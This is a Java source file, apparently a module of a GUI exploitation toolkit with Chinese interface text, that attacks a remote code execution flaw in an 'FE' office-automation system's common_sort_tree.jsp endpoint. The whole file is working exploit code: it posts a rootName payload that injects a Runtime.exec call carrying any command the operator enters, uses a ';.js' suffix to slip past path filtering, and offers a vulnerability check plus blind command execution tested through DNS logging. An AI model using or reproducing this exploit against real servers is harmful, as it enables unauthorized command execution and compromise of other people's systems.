package exp.oa.FE;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.getIndexOf;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.util.HashMap;

public class FE_common_sort_tree_RCE implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞已直接执行系统命令，无需getshell");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url,cmd, textArea,textArea_cmd);
//        return null;
    }
    private static String sort_tree(String url,String cmd){
        try {
            HttpURLConnection connection = HttpTools.getCoon(url+"/common/common_sort_tree.jsp;.js");
            connection.setRequestMethod("POST");
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            String data = "rootName={%25Thread.@java.lang.Runtime@getRuntime().exec('" + decrypt.code.getAllEncode.getAllUrlEncode(cmd, "") + "')%25}";
            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes(data);
            outputStream.flush();
            outputStream.close();

            int responseCode = connection.getResponseCode();

            BufferedReader reader;
            if (responseCode == HttpURLConnection.HTTP_OK) {
                reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            } else {
                reader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
            }

            String line;
            StringBuilder response = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            connection.disconnect();
            return response.toString();
        }catch (Exception e){
            return null;
        }
    }

    private Boolean att(String url, TextArea textArea) {
        try {
            String flag = sort_tree(url,"echo 1");
            if (flag.contains("<!DOCTYPE")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ FE_common_sort_tree_RCE ]");
                    textArea.appendText("\n 该漏洞为无回显形式\n输入dnslog进行测试,eg: ping dnslog");
                    textArea.appendText("\n");
                });


                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {

        try {
            String resultlist = sort_tree(url,cmd);
            if (resultlist.contains("<!DOCTYPE")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 执行完成！");
                    textArea_cmd.appendText("\n请自行判断是否执行成功");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 执行失败！");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
